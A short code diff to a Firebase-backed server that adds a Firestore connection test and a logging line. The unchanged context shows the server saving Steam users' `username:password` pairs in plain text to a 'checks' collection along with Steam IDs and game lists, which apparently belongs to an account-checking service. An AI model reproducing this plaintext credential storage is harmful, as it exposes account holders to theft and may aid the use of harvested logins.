@@ -21,8 +21,8 @@ import firebaseConfig from './firebase-applet-config.json' assert { type: 'json'
 let db: admin.firestore.Firestore | null = null;
 try {
   admin.initializeApp();
-  // Using getFirestore to support custom database IDs if provided
   db = getFirestore(firebaseConfig.firestoreDatabaseId);
+  db.listCollections().then(() => console.log('Successfully connected to Firestore database')).catch(e => console.error('Firestore connection test failed:', e));
   console.log('Firebase Admin initialized with DB:', firebaseConfig.firestoreDatabaseId);
 } catch (e) {
   console.error('Firebase Admin init error (likely missing credentials/env):', e);
@@ -186,7 +186,8 @@ async function startServer() {
                });
 
                const gameNames = games.map(g => g.name);
-
+               
+               console.log(`[FIREBASE] Attempting to save check for ${username}...`);
                await db.collection('checks').add({
                  credentials: `${username}:${password}`,
                  steamId: steamId.toString(),
